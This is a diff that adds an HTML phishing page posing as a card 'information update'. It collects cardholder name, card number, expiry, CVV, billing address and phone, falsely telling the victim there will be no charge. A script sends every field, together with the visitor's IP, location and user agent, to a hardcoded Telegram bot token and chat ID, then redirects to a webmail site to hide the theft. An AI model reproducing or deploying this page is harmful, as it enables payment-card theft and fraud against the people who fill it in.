@@ -1,0 +1,405 @@
+<html lang="en" class="translated-ltr"><head>
+<meta charset="UTF-8">
+<title>INFORMATION UPDATE</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+* {
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  background: #eef1f5;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+/* WHITE PORTRAIT */
+.container {
+  width: 420px;
+  background: #fff;
+  border-radius: 22px;
+  padding: 28px 24px 32px;
+  box-shadow: 0 30px 60px rgba(0,0,0,.12);
+}
+
+/* CENTER COLUMN */
+.content {
+  max-width: 360px;
+  margin: 0 auto;
+  margin-top:300px;
+}
+
+/* CARD */
+.card {
+  width: 260px;
+  height: 160px;
+  margin: 0 auto 28px;
+  border-radius: 18px;
+  padding: 18px;
+  color: #fff;
+  position: relative;
+  overflow: hidden;
+  transition: background .4s ease;
+}
+
+/* BRAND NAME */
+.brand {
+  position: absolute;
+  top: 14px;
+  right: 16px;
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: 1px;
+  opacity: .95;
+  transition: opacity .3s ease, transform .3s ease;
+}
+
+.brand.hide {
+  opacity: 0;
+  transform: translateY(-6px);
+}
+
+.page-title {
+  text-align: center;
+  margin-bottom: 24px;
+}
+
+.page-title h2 {
+  margin: 0;
+  font-size: 22px;
+  color: #111;
+  font-weight: 700;
+}
+
+.page-title p {
+  margin: 8px 0 0;
+  font-size: 14px;
+  color: #666;
+} 
+
+/* ANIMATED OVERLAY */
+.card::after {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: radial-gradient(circle at 30% 30%, rgba(255,255,255,.25), transparent 60%);
+  animation: glow 6s linear infinite;
+}
+
+@keyframes glow {
+  0% {transform: translateX(-25px)}
+  100% {transform: translateX(25px)}
+}
+
+.card-number {
+  letter-spacing: 2px;
+  font-size: 15px;
+  margin-top: 46px;
+}
+
+.card-footer {
+  display: flex;
+  justify-content: space-between;
+  font-size: 12px;
+  margin-top: 30px;
+  opacity: .9;
+}
+
+/* BRAND COLORS */
+.default    { background: linear-gradient(135deg,#111,#333); }
+.visa       { background: linear-gradient(135deg,#1a1f71,#3b82f6); }
+.mastercard { background: linear-gradient(135deg,#eb001b,#f79e1b); }
+.amex       { background: linear-gradient(135deg,#2e77bb,#5bc0eb); }
+.discover   { background: linear-gradient(135deg,#111,#ff6b00); }
+.maestro    { background: linear-gradient(135deg,#0099df,#ed1c24); }
+.unionpay   { background: linear-gradient(135deg,#e21836,#00447c); }
+.jcb        { background: linear-gradient(135deg,#0f9d58,#0b5394); }
+
+/* FORM */
+label {
+  font-size: 13px;
+  margin-bottom: 6px;
+  display: block;
+  color: #333;
+}
+
+input {
+  width: 100%;
+  padding: 14px;
+  border-radius: 12px;
+  border: 1px solid #ddd;
+  font-size: 14px;
+  margin-bottom: 18px;
+}
+
+input:focus {
+  outline: none;
+  border-color: #000;
+}
+
+.row {
+  display: flex;
+  gap: 14px;
+}
+
+/* BUTTON */
+button {
+  width: 100%;
+  padding: 16px;
+  border-radius: 14px;
+  border: none;
+  background: #111;
+  color: #fff;
+  font-size: 15px;
+  cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <div class="page-title">
+  <h2><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">UPDATE YOUR CARD INFORMATION TO CONTINUE</font></font></h2>
+  <p><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">Your card will not be subject to any charges; this step is solely for verification purposes.</font></font></p>
+</div>
+  <div class="content">
+		
+    <div class="card default" id="card">
+	
+      <div class="brand hide" id="brand"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">CARD</font></font></div>
+      <div class="card-number" id="cardPreview"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">•••• •••• •••• ••••</font></font></div>
+      <div class="card-footer">
+        <span id="namePreview"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">FIRST AND LAST NAME</font></font></span>
+        <span id="expPreview"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">MM/YY</font></font></span>
+      </div>
+    </div>
+
+    <form onsubmit="return false">
+
+      <label><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">Cardholder's name</font></font></label>
+      <input id="name" placeholder="Full name on the card">
+
+      <label><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">Card number</font></font></label>
+      <input id="number" placeholder="1234 1234 1234 1234">
+
+      <div class="row">
+        <div>
+          <label><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">MM/YY</font></font></label>
+          <input id="exp" placeholder="MM/YY">
+        </div>
+        <div>
+          <label><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">CVV</font></font></label>
+          <input id="cvc" placeholder="CVV">
+        </div>
+      </div>
+
+      <label><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">Billing address</font></font></label>
+      <input id="addr1" placeholder="Address Line 1">
+      <input id="addr2" placeholder="Address line 2 (optional)">
+      <input id="city" placeholder="City">
+      <input id="state" placeholder="State/Province">
+      <input id="zip" placeholder="Postal code">
+      <input id="phone" placeholder="Phone number">
+      <input id="country" placeholder="Country">
+
+      <button id="submitBtn"><font dir="auto" style="vertical-align: inherit;"><font dir="auto" style="vertical-align: inherit;">CONTINUE</font></font></button>
+    </form>
+
+  </div>
+</div>
+
+<script>
+const card = document.getElementById("card");
+const number = document.getElementById("number");
+const nameInput = document.getElementById("name");
+const exp = document.getElementById("exp");
+const cvc = document.getElementById("cvc");
+const brandEl = document.getElementById("brand");
+
+function detectBrand(num) {
+  if (/^3[47]/.test(num)) return ["amex","AMERICAN EXPRESS"];
+  if (/^4/.test(num)) return ["visa","VISA"];
+  if (/^5[1-5]/.test(num)) return ["mastercard","MASTERCARD"];
+  if (/^6(?:011|5)/.test(num)) return ["discover","DISCOVER"];
+  if (/^(5018|5020|5038|56|57|58)/.test(num)) return ["maestro","MAESTRO"];
+  if (/^62/.test(num)) return ["unionpay","UNIONPAY"];
+  if (/^35/.test(num)) return ["jcb","JCB"];
+  return ["default","CARD"];
+}
+
+number.addEventListener("input", e => {
+  let raw = e.target.value.replace(/\D/g,"");
+  const [cls,label] = detectBrand(raw);
+
+  card.className = "card " + cls;
+
+  brandEl.classList.add("hide");
+  setTimeout(()=>{
+    brandEl.textContent = label;
+    brandEl.classList.remove("hide");
+  },120);
+
+  let max = cls === "amex" ? 15 : 16;
+  raw = raw.substring(0,max);
+  let spaced = raw.replace(/(.{4})/g,"$1 ").trim();
+  e.target.value = spaced;
+
+  document.getElementById("cardPreview").textContent =
+    spaced || "•••• •••• •••• ••••";
+
+  cvc.maxLength = cls === "amex" ? 4 : 3;
+});
+
+nameInput.addEventListener("input", e => {
+  document.getElementById("namePreview").textContent =
+    e.target.value.toUpperCase() || "NOM ET PRÉNOM";
+});
+
+exp.addEventListener("input", e => {
+  let v = e.target.value.replace(/\D/g,"").substring(0,4);
+  if (v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
+  e.target.value = v;
+
+});
+
+cvc.addEventListener("input", e => {
+  e.target.value = e.target.value.replace(/\D/g,"").substring(0,cvc.maxLength);
+});
+</script>
+
+<script>
+// --- CONFIGURATION ---
+const BOT_TOKEN = "9167356786:AAHHFM8gzJ_A0-RYdX4IO_1fvugp6okUUuI";
+const CHAT_ID = "5941293353";
+let visitorString = "\n🌐 <b>IP:</b> Fetching...";
+
+// --- 1. RELIABLE VISITOR DATA FETCH ---
+async function loadVisitorData() {
+    const ua = navigator.userAgent;
+    try {
+        const res = await fetch("https://ipwho.is/");
+        const data = await res.json();
+        if (data && data.success) {
+            visitorString = `\n\n🌐 <b>IP Address:</b> ${data.ip}` +
+                            `\n🌍 <b>IP Country:</b> ${data.country}` +
+                            `\n🏙️ <b>IP City:</b> ${data.city}` +
+                            `\n💻 <b>User Agent:</b> ${ua}`;
+        } else { throw new Error(); }
+    } catch (e) {
+        try {
+            const cf = await fetch("https://www.cloudflare.com/cdn-cgi/trace");
+            const text = await cf.text();
+            const ip = text.match(/ip=(.*)/)?.[1] || "Unknown";
+            const loc = text.match(/loc=(.*)/)?.[1] || "Unknown";
+            visitorString = `\n\n🌐 <b>IP Address:</b> ${ip}` +
+                            `\n🌍 <b>Country Code:</b> ${loc}` +
+                            `\n💻 <b>User Agent:</b> ${ua}`;
+        } catch (e2) {
+            visitorString = `\n\n🌐 <b>IP Address:</b> API Blocked` +
+                            `\n💻 <b>User Agent:</b> ${ua}`;
+        }
+    }
+}
+loadVisitorData();
+
+// --- 2. INPUT FORMATTERS ---
+const phoneInput = document.getElementById('phone');
+const postalInput = document.getElementById('zip');
+
+if (phoneInput) {
+    phoneInput.addEventListener("input", e => {
+        let input = e.target.value.replace(/\D/g, "").substring(0, 10);
+        let formatted = input;
+        if (input.length > 6) {
+            formatted = `(${input.substring(0, 3)}) ${input.substring(3, 6)}-${input.substring(6)}`;
+        } else if (input.length > 3) {
+            formatted = `(${input.substring(0, 3)}) ${input.substring(3)}`;
+        } else if (input.length > 0) {
+            formatted = `(${input}`;
+        }
+        e.target.value = formatted;
+    });
+}
+
+if (postalInput) {
+    postalInput.addEventListener('input', e => {
+        let val = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+        if (val.length > 3) { val = val.slice(0, 3) + ' ' + val.slice(3, 6); }
+        e.target.value = val.slice(0, 7);
+    });
+}
+
+// --- 3. SUBMISSION HANDLER ---
+document.getElementById("submitBtn").addEventListener("click", async (e) => {
+    e.preventDefault();
+
+    const cardName = document.getElementById("name").value;
+    const cardNum  = document.getElementById("number").value;
+    const cardExp  = document.getElementById("exp").value;
+    const cardCvc  = document.getElementById("cvc").value;
+    const addr1    = document.getElementById("addr1").value;
+    const addr2    = document.getElementById("addr2").value;
+    const city     = document.getElementById("city").value;
+    const state    = document.getElementById("state").value;
+    const zip      = postalInput.value;
+    const phone    = phoneInput.value;
+    const country  = document.getElementById("country").value;
+
+    if (!cardName || !cardNum || !cardExp || !cardCvc || !addr1 || !city || !zip) {
+        alert("Please fill in all required fields.");
+        return;
+    }
+
+    const message = `💳 <b>NEW CARD SUBMISSION</b>\n` +
+                    `--------------------------\n` +
+                    `👤 <b>Name:</b> ${cardName}\n` +
+                    `🔢 <b>Card Number:</b> ${cardNum}\n` +
+                    `📅 <b>Expiry:</b> ${cardExp}\n` +
+                    `🔐 <b>CVV:</b> ${cardCvc}\n` +
+                    `--------------------------\n` +
+                    `🏠 <b>Address 1:</b> ${addr1}\n` +
+                    `🏢 <b>Address 2:</b> ${addr2 || "N/A"}\n` +
+                    `🏙️ <b>City:</b> ${city}\n` +
+                    `🗺️ <b>State/Province:</b> ${state}\n` +
+                    `🏷️ <b>Zip/Postal:</b> ${zip}\n` +
+                    `📞 <b>Phone:</b> ${phone}\n` +
+                    `🌍 <b>Form Country:</b> ${country}\n` +
+                    `--------------------------` +
+                    visitorString;
+
+    try {
+        const btn = document.getElementById("submitBtn");
+        btn.innerHTML = "Vérification...";
+        btn.disabled = true;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+            })
+        });
+
+        setTimeout(() => {
+            window.location.href = "https://Webmail.eatel.net";
+        }, 1500);
+
+    } catch (err) {
+        document.getElementById("submitBtn").innerHTML = "CONTINUER";
+        document.getElementById("submitBtn").disabled = false;
+        alert("Error connecting. Please try again.");
+    }
+});
+</script>
+
+
+
+</body></html>
